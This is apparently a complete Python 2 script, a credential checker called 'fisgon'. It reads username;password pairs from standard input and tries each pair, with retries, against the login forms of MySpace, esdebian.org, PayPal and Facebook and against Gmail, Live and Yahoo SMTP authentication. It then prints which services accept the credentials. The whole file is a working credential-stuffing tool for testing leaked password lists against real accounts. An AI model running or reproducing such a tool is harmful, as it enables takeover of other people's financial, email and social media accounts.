#!/usr/bin/env python
#-*- coding: UTF-8 -*-
from browser import BROWSER
import re
import smtplib
import socket
import sys
import time
import os
import debug as Debug
debug = Debug.debug

from decoradores import Cache, Retry, Timeit
from threading import Thread

RC = "%s/.fisgon/" % os.getenv("HOME")

import twill
BrowserStateError = twill.browser.BrowserStateError

class Async(Thread):
    def __init__(self, func):
        self.func = func
        self.__name__ = func.func_name
        Thread.__init__(self)
        self.result = None
    def __call__(self, *args, **kw):
        self.args = args
        self.kw = kw
        self.start()
        return self
    def run(self, *args, **kw):
        self.result = self.func(*self.args, **self.kw)
    def get_result(self):
        self.join()
        return self.result
       
       

class Discovers(list):
    def __call__(self, func):
        self.append(func)
        return func

discovers = Discovers()

def ismail(user):
    """De momento la expresión regular no funciona"""
    return "@" in user

@discovers
@Timeit
@Cache(ruta=RC + "myspace.pickle")
@Retry(15)
def myspace(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://myspace.com", cache=1000)[1]
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Email_Textbox"""] = user
        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Password_Textbox"""] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """?fuseaction=signout""" in b.get_html():
                    return "myspace.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Timeit
@Cache(ruta=RC + "esdebian.pickle")
@Retry(15)
def esdebian(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://www.esdebian.org", cache=1000)[1]
        form["name"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """<a href="/logout">Salir</a>""" in b.get_html():
                    return "esdebian.org"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Timeit
@Cache(ruta=RC + "paypal.pickle")
@Retry(15)
def paypal(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
            "?cmd=_login-run", cache=0*1000)[1]
        form["login_email"] = user
        form["login_password"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if ('cgi-bin/webscr?cmd=_login-done' in b.get_html()):
                    return "paypal.com"
                elif ('cgi-bin/webscr?cmd=_logout' in b.get_html(
                    "https://www.paypal.com/ar/cgi-bin/webscr?"
                    "cmd=_account&nav=0")):
                    return "paypal.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Timeit
@Cache(ruta=RC + "facebook.pickle")
@Retry(15)
def facebook(user, password):
    if ismail(user):
        b.clear_cookies()
        form = b.get_forms("http://facebook.com", cache=1000)[0]
        form["email"] = user
        form["pass"] = password
        try:
            code, title = form.submit()
            if code == 200:
                if """facebook.com/logout.php?""" in b.get_html():
                    return "facebook.com"
                else:
                    return False
            else:
                return None
        except BrowserStateError:
            return None
    else:
        return False

@discovers
@Timeit
@Cache(ruta=RC + "gmail.pickle")
@Retry(15)
def gmail(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.gmail.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    return "gmail.com"

@discovers
@Timeit
@Cache(ruta=RC + "live.pickle")
@Retry(15)
def live(user, password):
    if ismail(user):
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.live.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.debuglevel = 0
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
            except socket.sslerror:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    return "live.com"

@discovers
@Timeit
@Cache(ruta=RC + "yahoo.pickle")
@Retry(15)
def yahoo(user, password):
    if ismail(user) and "@yahoo." in user:
        smtp = smtplib.SMTP()
        try:
            smtp.connect("smtp.mail.yahoo.com")
            smtp.debuglevel = 0
            smtp.ehlo()
            try:
                smtp.login(user, password)
            except smtplib.SMTPAuthenticationError:
                return False
        except socket.gaierror:
            debug("E: socket.gaierror")
            return None
    else:
        return False
    return "yahoo.com"


def main():
    debug("FUN TIME!")
    entrada = sys.stdin.readline()
    while entrada:
        Debug.INICIO = time.time()
        u, p = entrada.strip().split(";")[:2]
        u = u.lower()

#        #Multi-tareas
#        hilos = [Async(d) for d in discovers]
#        funciones = [h(u, p) for h in hilos]
#        resultados = [f.get_result() for f in funciones]

        #Monotarea
        resultados = [d(u, p) for d in discovers]

        resultados = [r for r in resultados if r]
        debug("%s; %s; %s" % (u, p, str(resultados)))
        print("%s;%s;%s" % (u, p, ",".join(resultados)))
        sys.stdout.flush()
        entrada = sys.stdin.readline()
    debug(">>> EOF !!")

if __name__ == "__main__":
    b = BROWSER()
    exit(main())
